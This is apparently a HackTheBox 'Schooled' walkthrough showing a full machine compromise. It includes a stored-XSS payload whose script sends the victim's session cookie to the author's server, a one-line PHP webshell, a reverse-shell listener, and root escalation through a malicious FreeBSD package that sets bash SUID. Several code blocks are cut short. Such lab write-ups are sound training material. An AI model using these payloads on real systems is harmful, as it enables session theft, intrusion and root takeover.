Schooled is a medium rated box on hackthebox created by [TheCyberGeek](https://www.hackthebox.eu/home/users/profile/114053). It involves some amount of enumeration to discover a vhost, XSS to get to a privileged user and CVE in moodle to get a foothold on the machine. For the root part we will find credentials in a database which we crack with hashcat. Finally we will create our own malicious FreeBSD package to escalate to the root user.

# User

## Nmap

As usual we start our enumeration off with a nmap scan for a first recon on the machine. The scan shows ports 22, 80 and 33060 open against which we run an additional script and version detection scan.

`All ports`
```

## schooled.htb

Going to port 80 we can see a website for a school which seems to be completly static so it is not of much use to us. However there is a possible vhost name at the botton of the page.

[![schooled_vhost](/img/schooled/schooled_vhost.png)](/img/schooled/schooled_vhost.png)

## moodle.schooled.htb

### Teacher

Since there doesn't seem to be much of an attack surface on the initial page and we discovered a vhost, we fuzz with ffuf for additional vhosts in the next step. This gets us the page `moodle.schooled.htb`.

```
$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://schooled.htb -H 'Host: FUZZ.schooled.htb' -fs 20750

```

Adding it to our `/etc/hosts` file and going to the page there is a moodle installation running. Moodle is a popular school software.

[![moodle_home](/img/schooled/moodle_home.png)](/img/schooled/moodle_home.png)

Going over to the login page we are can see that we are able to create a new account.

[![moodle_login](/img/schooled/moodle_login.png)](/img/schooled/moodle_login.png)

Trying to signup we get an error message stating we need a `student.schooled.htb` email address.

[![signup_fail](/img/schooled/signup_fail.png)](/img/schooled/signup_fail.png)

Exchanging our email domain from `a.com` to `student.schooled.htb` we are able to successfully create an account.

[![signup_success](/img/schooled/signup_fail.png)](/img/schooled/signup_fail.png)

[![moodle_logged_in](/img/schooled/moodle_logged_in.png)](/img/schooled/moodle_logged_in.png)

Going over to `Site home` and the mathematics course, we see that we can self enroll into it and that no enrolment key is required.

[![moodle_self_enroll](/img/schooled/moodle_self_enroll.png)](/img/schooled/moodle_self_enroll.png)

After enrolling we go over to announcements and the `Reminder for joining students` contains some interesting information. New students are required to set their `MoodleNet profile` and the teacher seems to be checking this. This means if we find a XSS vulnerability on the profile page we might be able to steal the teachers cookie and impersonate him.

[![announcement](/img/schooled/announcement.png)](/img/schooled/announcement.png)

Looking for vulnerabilties in the MoodleNet field in the user profile we find a possible stored XSS vulnerability in [CVE-2020-25627](https://moodle.org/mod/forum/discuss.php?d=410839), which seems to be just what we need to advance right now. Also the `HttpOnly` flag for the session cookie is not set which promises success.

To exploit it we put this payload in the MoodleNet profile, editing the profile of the user we created.

[![moodle_xss](/img/schooled/moodle_xss.png)](/img/schooled/moodle_xss.png)

We choose a payload that includes a javascript file hosted by use to have more room to work with.

```
<script src="http://10.10.14.65/a.js"></script>
```

After that we standup a python webserver on port 80, hosting a script with the following content and update the profile containing our payload.

`a.js`
```js
var cookie = document.cookie;

xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.14.65/' + cookie, false);
xhr.send();
```

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

The teacher looks every two minutes at the users profiles, so we get a hit on our webserver back relatively quick with the teachers session id.

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.186.182 - - [14/Aug/2021 10:46:20] "GET /a.js HTTP/1.1" 200 -
10.129.186.182 - - [14/Aug/2021 10:46:20] code 404, message File not found
10.129.186.182 - - [14/Aug/2021 10:46:20] "GET /MoodleSession=2h002baljt8tk8eb9dl201ar58 HTTP/1.1" 404 -
```

Switching his session id with ours in the browser we are now logged in as Manuel Phillips and have some additional rights.

[![logged_in_teacher](/img/schooled/logged_in_teacher.png)](/img/schooled/logged_in_teacher.png)

### Manager

Going over to a course we can now click on the `Moodle Docs for this page` link, which takes us to the corresponding Documentation of the running moodle version.

[![moodle_docs](/img/schooled/moodle_docs.png)](/img/schooled/moodle_docs.png)

Having the version identified as 3.9 we can now look for additional CVE's for this Version and find one in CVE-2020-14321.
Following this PoC video on [youtube](https://www.youtube.com/watch?v=BkEInFI4oIU) and this [github repository](https://github.com/HoangKien1020/CVE-2020-14321) we are able to gain RCE on the server.
The first step for this exploit is to find a user with the manager role assigned, which we then can in impersonate in a following step.

This user turns out to be Lianne. We navigate to the Participants menu in the mathematics course, click on enrol users and select Lianne.

[![enroll_lianne](/img/schooled/enroll_lianne.png)](/img/schooled/enroll_lianne.png)

Then we intercept the request in burp and send it to repeater. Following the video we turn off intercepting and switch the userlist parameter in the request to the profile id of Manuel which is 24, we also change the `roletoassign` parameter to 1 and send the request in repeater. We can also assign additional roles to the user by changing the `roletoassign` parameter to different values.

[![assign_roles](/img/schooled/assign_roles.png)](/img/schooled/assign_roles.png)

Only the manager role is important but we can proof to add about any role to the user repeating the process with different numbers.

[![roles_assigned](/img/schooled/roles_assigned.png)](/img/schooled/roles_assigned.png)

Refreshing the participants page we see a lot of additional roles assigned to the teacher. Clicking on Lianne Carter we can log in as her due to our `manager` role.

[![login_lianne](/img/schooled/login_lianne.png)](/img/schooled/login_lianne.png)

After logging in we see she has site administration privileges.

[![lianne_admin](/img/schooled/lianne_admin.png)](/img/schooled/lianne_admin.png)

Following the PoC we browse to `Site administration` => `Users` => `Define roles` => `Manager` => `Edit` to give ourselves the most permissions possible.

[![edit_manager](/img/schooled/edit_manager.png)](/img/schooled/edit_manager.png)

We set intercept in burp and click on save changes. In the request we change the permission for the ones listed in README.md of the earlier mentioned github repository. This gives us most possible access on the moodle installation.

[![moodle_max_perm](/img/schooled/moodle_max_perm.png)](/img/schooled/moodle_max_perm.png)

### RCE

Following the PoC we go to `Site administration` => `Plugins` => `Install Plugins` => `Choose a file...` and select the `rce.zip` we downloaded from the repository.

[![plugin_upload](/img/schooled/plugin_upload.png)](/img/schooled/plugin_upload.png)

Unpacking the zip locally it contains a `README.md` with the path for the uploaded webshell.

```
$ find rce/
rce/
rce/lang
rce/lang/en
rce/lang/en/block_rce.php
rce/version.php
$ cat README.md
# Moodle_RCE
### From admin, goto:
*domain/admin/tool/installaddon/index.php*

Upload rce.zip
### Trigger RCE
*domain/blocks/rce/lang/en/block_rce.php?cmd=id*
#### Video PoC
$ cat rce/lang/en/block_rce.php
<?php system($_GET['cmd']); ?>
```

The README.md contains the path to the upload functionality and also the location the webshell get's placed after unzipping and installing it.

After clicking on install and continue the plugin get's successfully installed. Browsing to it and testing it we have achieved RCE on the server.

[![rce_poc](/img/schooled/rce_poc.png)](/img/schooled/rce_poc.png)

We send the request to burp repeater set up a ncat listener and send ourselves a reverse shell.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

[![burp_revshell](/img/schooled/burp_revshell.png)](/img/schooled/burp_revshell.png)

We get a connection back instantly. Python is not in the path to upgrade our shell but we can identify its location with a quick find command.

```
$ nc -lnvp 7575

### Database

After doing some enumeration on the machine we are able to find database credentials in `/usr/local/www/apache24/data/moodle/config.php`. Using these credentials we are able to retrieve the password hashes from the moodle database.

## Manual package

Running `sudo -l` as jamie we see he can update the pkg repository and als install random packages.

```bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
   (ALL) NOPASSWD: /usr/sbin/pkg update
   (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Looking at the config file for pkg we can see it points to the host devops.htb. The way this was intended to be solved was to use both the update and install command. That is why we are in the wheel group which can edit the `/etc/hosts` file. We will first solve it this way and then cover a quicker simpler solution.

```bash
jamie@Schooled:~ $ cat /etc/pkg/FreeBSD.conf
# $FreeBSD$
#
# To disable this repository, instead of modifying or removing this file,
# create a /usr/local/etc/pkg/repos/FreeBSD.conf file:
#
#   mkdir -p /usr/local/etc/pkg/repos
#   echo "FreeBSD: { enabled: no }" > /usr/local/etc/pkg/repos/FreeBSD.conf
#

FreeBSD: {
  url: "pkg+http://devops.htb:80/packages",
  mirror_type: "srv",
  signature_type: "none",
  fingerprints: "/usr/share/keys/pkg",
  enabled: yes
}
```

```bash
jamie@Schooled:~ $ ls -la /etc/hosts
-rw-rw-r--  1 root  wheel  1098 Mar 17 15:47 /etc/hosts
```

`/etc/hosts` being writable means we can point the repository update to our machine hosting a repo with a package containing a malicious postinstall script. In this script we can run any command we want as root. I chose to give bash suid.
For the package creation these [two](http://lastsummer.de/creating-custom-packages-on-freebsd/) [blogposts](http://lastsummer.de/setting-up-a-package-mirror-on-freebsd/) are helpful.
Following them we can create our own package and make a repository out of it, which
we then copy over to our machine via scp. Since the necessary tools to create the repository are already on the machine we will do it there. There is also a cleanup script running on the machine so we will work out of a folder it does not clean. First we follow the blogpost to write a package creation script with a pre and postinstall hook giving bash the suid bit and create a copy of `/etc/hosts` where `devops.htb` get resolved to our ip.

```

In a next step we create the necessary files and use `pkg` to package them up to a repository.

```
jamie@Schooled:/tmp $ bash /home/jamie/create_packet.sh && mkdir packages
jamie@Schooled:/tmp $ mv mypackage-2.0_5.txz packages/
jamie@Schooled:/tmp $ pkg repo /tmp/packages
Creating repository in /tmp/packages: 100%
Packing files for repository: 100%
```

We move the repository back to our machine with scp and host it with a python webserver.

```
$ scp -r jamie@schooled.htb:/tmp/packages .
Password for jamie@Schooled:
packagesite.txz 100%  472     1.6KB/s   00:00

```

```
$ sudo python3 -m http.server 80

```

Now we can install the package after copying our modified `hosts` file over the real one.

```
jamie@Schooled:/tmp $ cp /home/jamie/hosts /etc/hosts &&  sudo pkg update && sudo pkg install mypackage

The code got executed and we can use the suid bash to escalate to the root user.

```
jamie@Schooled:/tmp $ bash -p

[jamie@Schooled /tmp]#
```

### FPM package
There is also another method involving pkg and fpm which is much quicker than the intended one. There was no entry for pkg in gtfobins at the time for release, but it got added later by a HTB user after doing the box.

First we have to create the package with fpm using the following steps.

```
$ TF=$(mktemp -d)
$ echo 'chmod +s /bin/bash' > $TF/x.sh
$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

        /usr/local/bin/fpm:23:in `<main>'
Created package {:path=>"x-1.0.txz"}
```

Now we can transfer the created package over with curl, install it with the `--no-repo-update` flag, drop into a root shell and grab the flag.

```
